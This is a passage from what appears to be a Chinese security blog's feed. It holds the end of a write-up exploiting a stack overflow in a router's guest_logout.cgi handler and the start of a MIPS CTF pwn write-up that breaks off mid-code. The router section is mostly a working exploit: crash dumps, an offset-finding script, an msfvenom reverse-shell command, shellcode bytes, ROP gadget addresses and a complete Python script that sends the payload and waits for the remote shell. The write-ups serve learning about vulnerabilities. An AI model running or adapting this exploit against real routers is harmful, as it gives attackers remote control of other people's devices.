class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x0</span><br><span class="line">*V1   0x73</span><br><span class="line">*A0   0x4d81f2 (post_buf+66) ◂— <span class="string">&#x27;tatus_guestnet.aspaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line">*A1   0x47f785 ◂— <span class="string">&#x27;ogin_guest.asp&#x27;</span></span><br><span class="line">*A2   0x168</span><br><span class="line">*A3   0x4fa608 ◂— 0x0</span><br><span class="line">*T0   0x4fa5b0 ◂— 0x0</span><br><span class="line">*T1   0x4fa5b0 ◂— 0x0</span><br><span class="line">*T2   0x111</span><br><span class="line">*T3   0xfffffff0</span><br><span class="line">*T4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T5   0x2b030004 (__ctype_b) —▸ 0x2afeabc0 (__C_ctype_b_data+256) ◂— 0x2000200</span><br><span class="line">*T6   0xca5fb1e</span><br><span class="line">*T7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*T8   0x1</span><br><span class="line">*T9   0x2afc64d0 (strcoll) ◂— lbu    <span class="variable">$v1</span>, (<span class="variable">$a0</span>)</span><br><span class="line">*S0   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S1   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S2   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S3   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S4   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S5   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S6   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S7   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*S8   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">*FP   0x7fce1458 ◂— <span class="string">&#x27;aaaaaaaaaaa&#x27;</span></span><br><span class="line">*SP   0x7fce1458 ◂— <span class="string">&#x27;aaaaaaaaaaa&#x27;</span></span><br><span class="line">*PC   0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x61616161</span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ fp sp  0x7fce1458 ◂— <span class="string">&#x27;aaaaaaaaaaa&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">02:0008│        0x7fce1460 ◂— 0x616161 /* <span class="string">&#x27;aaa&#x27;</span> */</span><br><span class="line">03:000c│        0x7fce1464 ◂— 0x0</span><br><span class="line">04:0010│        0x7fce1468 —▸ 0x7fce1bc8 ◂— <span class="string">&#x27;guest_logout.cgi&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">06:0018│        0x7fce1470 —▸ 0x4d81b0 (post_buf) ◂— <span class="string">&#x27;cmac&#x27;</span></span><br><span class="line">07:001c│        0x7fce1474 ◂— 0x0</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 61616161</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到寄存器被控制，可以利用该漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="确认溢出长度"><a href="#确认溢出长度" class="headerlink" title="确认溢出长度"></a>确认溢出长度</h4><p>用<code>pwntools</code>的<code>cyclic</code>进行发包测试，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+cyclic(<span class="number">100</span>),<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>得到gdb寄存器值如下，可以看到pc对应<code>aaaw</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x0</span><br><span class="line">*V1   0x73</span><br><span class="line">*A0   0x4d81f2 (post_buf+66) ◂— <span class="string">&#x27;tatus_guestnet.aspaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span></span><br><span class="line">*A1   0x47f785 ◂— <span class="string">&#x27;ogin_guest.asp&#x27;</span></span><br><span class="line">*A2   0x68</span><br><span class="line">*A3   0x4fa3d8 ◂— 0x0</span><br><span class="line">*T0   0x4fa380 ◂— 0xa9958270</span><br><span class="line">*T1   0x4fa380 ◂— 0xa9958270</span><br><span class="line">*T2   0x11</span><br><span class="line">*T3   0xfffffff0</span><br><span class="line">*T4   0x61617361 (<span class="string">&#x27;asaa&#x27;</span>)</span><br><span class="line">*T5   0x2b030004 (__ctype_b) —▸ 0x2afeabc0 (__C_ctype_b_data+256) ◂— 0x2000200</span><br><span class="line">*T6   0xca5fb1e</span><br><span class="line">*T7   0x61617461 (<span class="string">&#x27;ataa&#x27;</span>)</span><br><span class="line">*T8   0x3</span><br><span class="line">*T9   0x2afc64d0 (strcoll) ◂— lbu    <span class="variable">$v1</span>, (<span class="variable">$a0</span>)</span><br><span class="line">*S0   0x6e616161 (<span class="string">&#x27;aaan&#x27;</span>)</span><br><span class="line">*S1   0x6f616161 (<span class="string">&#x27;aaao&#x27;</span>)</span><br><span class="line">*S2   0x70616161 (<span class="string">&#x27;aaap&#x27;</span>)</span><br><span class="line">*S3   0x71616161 (<span class="string">&#x27;aaaq&#x27;</span>)</span><br><span class="line">*S4   0x72616161 (<span class="string">&#x27;aaar&#x27;</span>)</span><br><span class="line">*S5   0x73616161 (<span class="string">&#x27;aaas&#x27;</span>)</span><br><span class="line">*S6   0x74616161 (<span class="string">&#x27;aaat&#x27;</span>)</span><br><span class="line">*S7   0x75616161 (<span class="string">&#x27;aaau&#x27;</span>)</span><br><span class="line">*S8   0x76616161 (<span class="string">&#x27;aaav&#x27;</span>)</span><br><span class="line">*FP   0x7fa20458 ◂— <span class="string">&#x27;aaaxaaayaaa&#x27;</span></span><br><span class="line">*SP   0x7fa20458 ◂— <span class="string">&#x27;aaaxaaayaaa&#x27;</span></span><br><span class="line">*PC   0x77616161 (<span class="string">&#x27;aaaw&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用<code>pwntools</code>的cyclic_find函数，得到溢出长度为85</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/rv110w$ python</span><br><span class="line">Python 2.7.12 (default, Oct  5 2020, 13:56:01) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; cyclic_find(<span class="string">&quot;aaaw&quot;</span>)</span><br><span class="line">85</span><br></pre></td></tr></table></figure><h4 id="空字节绕过"><a href="#空字节绕过" class="headerlink" title="空字节绕过"></a>空字节绕过</h4><p>由于溢出点是sscanf，若payload中有NULL字节则会被截断，所以需要绕过00.</p><p>用IDA的mipsrop插件查看httpd本身的gadget，可以发现程序地址本身包含00，无法调用，且程序没有开启PIE，无法满足要求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00409A14  |  addiu <span class="variable">$v1</span>,<span class="variable">$sp</span>,0x178+var_158                         |  jalr  <span class="variable">$s2</span>                             |</span><br><span class="line">|  0x00409A44  |  addiu <span class="variable">$s0</span>,<span class="variable">$sp</span>,0x178+var_64                          |  jalr  <span class="variable">$s2</span> </span><br></pre></td></tr></table></figure><p>考虑使用动态库中的gadget。在这一设备中，相同的二进制程序启动的libc基址是相同的，对于httpd，libc的基址为<code>0x2af98000</code>,可以使用该库内的gadget</p><p>对于shellcode，这里使用<code>msfvenom</code>生成，具体方法为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.100 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py </span><br></pre></td></tr></table></figure><p>生成的shellcode内容如下，不带00且满足要求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x64\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br></pre></td></tr></table></figure><p>接下来使用ret2libc方法构建rop，lic库文件为<code>libc.so.0</code>，使用mipsrop可找到gadget，共有32gadget，这里使用一个跳转到s3的gadget，找到对应的间接跳转到a0的寄存器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|  0x00025CAC  |  addiu <span class="variable">$a0</span>,<span class="variable">$sp</span>,0x38+var_20                           |  jalr  <span class="variable">$s3</span> </span><br><span class="line">|  0x0003D050  |  move <span class="variable">$t9</span>,<span class="variable">$a0</span>                                        |  jalr  <span class="variable">$a0</span> </span><br></pre></td></tr></table></figure><p>原本是准备使用一个跳转到s0的gadget，但发现其虽然在mipsrop找出来符合修改a0的条件，但跳转到该位置才发现不符合，故换了一个gadget</p><p>之前已找到控制ra的偏移值为85，可以在IDA中查看函数段的末尾，可以发现控制s3的偏移值为24，最终完成的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,thread</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启监听线程</span></span><br><span class="line">io = listen(<span class="number">8888</span>)</span><br><span class="line"><span class="comment">#libc基址和gadget地址</span></span><br><span class="line">url=<span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jar_a0=<span class="number">0x0003D050</span>+libc   <span class="comment">#move $t9,$a0 </span></span><br><span class="line">jar_s3=<span class="number">0x00025CAC</span>+libc   <span class="comment">#addiu $a0,$sp,0x38+var_10  </span></span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x64\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">61</span>+p32(jar_a0)+<span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p32(jar_s3)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+buf</span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:payload,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">thread.start_new_thread(attack,())</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="获取shell后的操作"><a href="#获取shell后的操作" class="headerlink" title="获取shell后的操作"></a>获取shell后的操作</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWN-MIPS-mpwn</title>
      <link href="2020/11/23/PWN-MIPS-mpwn/"/>
      <url>2020/11/23/PWN-MIPS-mpwn/</url>
      
        <content type="html"><![CDATA[<p><strong>同样是MIPS架构pwn的入门题（误），尝试做做，看来我离入门还有很长的路要走</strong></p><a id="more"></a><p>首先检查文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/mpwn$ file pwn</span><br><span class="line">pwn: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=e0782ebdf0d70b808dba4b10c6866faeae35c620, not stripped</span><br><span class="line">ssr@ubuntu:~/iot/mpwn$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/iot/mpwn/pwn&#x27;</span></span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看出是大端的MIPS32架构，没开任何保护，可以直接用<code>qemu-user</code>运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/mpwn$ qemu-mips ./pwn</span><br><span class="line">=== Welcome to visit H4-link! ===</span><br><span class="line">Enter the group number: </span><br></pre></td></tr></table></figure><p>显示要先输入一串。</p><p>用IDA打开分析，首先f5查看main函数伪码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_0(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  pwn();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;alloc success!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中banner函数即为输出开始那段welcome字符串，主要函数为pwn函数，其伪码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// $v0</span></span><br><span class="line">  _BOOL4 result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+0h] [+0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">2</span>]; <span class="comment">// [sp+10h] [+10h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+30h] [+30h]</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// [sp+34h] [+34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// [sp+38h] [+38h]</span></span><br><span class="line">  <span class="keyword">int</span> *v14; <span class="comment">// [sp+3Ch] [+3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+40h] [+40h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">  _BYTE *v17; <span class="comment">// [sp+48h] [+48h]</span></span><br><span class="line">  <span class="keyword">int</span> v18[<span class="number">3</span>]; <span class="comment">// [sp+4Ch] [+4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the group number: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18[<span class="number">0</span>] || v18[<span class="number">0</span>] &gt;= <span class="number">0xA</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;The numbers is illegal! Exit...\n&quot;</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="built_in">stderr</span>, <span class="number">4883200</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v18[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;v3;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">36</span> * v18[<span class="number">0</span>];</span><br><span class="line">  v11 = <span class="number">36</span> * v18[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">  v12 = v4;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">36</span> * v18[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i &lt; v18[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">    v14 = v13;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>);</span><br><span class="line">    v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = atoi(v6);</span><br><span class="line">      *v14 = v0;</span><br><span class="line">      v16 = <span class="built_in">strchr</span>(v6, <span class="number">58</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; v6++; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v6 == <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = 